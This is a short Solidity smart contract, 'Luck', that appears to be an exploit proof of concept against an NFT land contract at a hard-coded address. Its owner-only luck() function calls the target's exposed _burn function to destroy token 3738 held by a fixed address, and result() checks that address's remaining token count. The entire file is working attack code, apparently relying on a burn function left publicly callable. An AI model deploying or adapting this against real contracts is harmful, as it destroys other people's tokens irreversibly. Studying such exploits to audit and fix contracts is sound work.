// SPDX-License-Identifier: MIT
pragma solidity 0.8.11;

import "./interfaces/ILAND.sol";

contract Luck {
    address private immutable owner;
    address private constant LANDs = 0x50f5474724e0Ee42D9a4e711ccFB275809Fd6d4a;
    address private constant FROM = 0x9cfA73B8d300Ec5Bf204e4de4A58e5ee6B7dC93C;
    address private constant OWNER = 0x9cfA73B8d300Ec5Bf204e4de4A58e5ee6B7dC93C;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    function luck() external onlyOwner() {
        ILAND(LANDs)._burn(FROM, OWNER, 3738);
    }

    function result() external view onlyOwner() returns (uint256) {
        return (ILAND(LANDs)._numNFTPerAddress(FROM));
    }
}